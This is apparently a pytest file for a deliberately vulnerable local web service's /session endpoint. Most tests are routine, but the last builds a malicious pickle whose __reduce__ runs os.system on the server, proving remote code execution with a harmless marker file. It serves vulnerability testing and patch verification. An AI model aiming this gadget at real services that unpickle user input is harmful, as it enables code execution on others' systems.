"""Tests for S02 pickle deserialization scenario."""

import base64
import pickle

import httpx

BASE = "http://127.0.0.1:8000"


def test_health():
    r = httpx.get(f"{BASE}/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"


def test_session_normal():
    session_data = {"user": "alice", "role": "admin"}
    blob = base64.b64encode(pickle.dumps(session_data)).decode()
    r = httpx.post(f"{BASE}/session", content=blob)
    assert r.status_code == 200
    data = r.json()
    assert data["session"]["user"] == "alice"


def test_session_empty():
    r = httpx.post(f"{BASE}/session", content="")
    assert r.status_code == 200
    assert "error" in r.json()


def test_session_invalid_base64():
    r = httpx.post(f"{BASE}/session", content="not-valid-base64!!!")
    assert r.status_code == 200
    assert "error" in r.json()


def test_pickle_exec_proves_rce():
    """Craft a pickle that writes a marker file — proves code execution."""
    import os

    class RCE:
        def __reduce__(self):
            marker = "/tmp/patchproof_pwned"
            return (os.system, (f'echo "pickle_rce" > {marker}',))

    blob = base64.b64encode(pickle.dumps(RCE())).decode()
    r = httpx.post(f"{BASE}/session", content=blob)
    assert r.status_code == 200
    assert os.path.exists("/tmp/patchproof_pwned")
    os.remove("/tmp/patchproof_pwned")
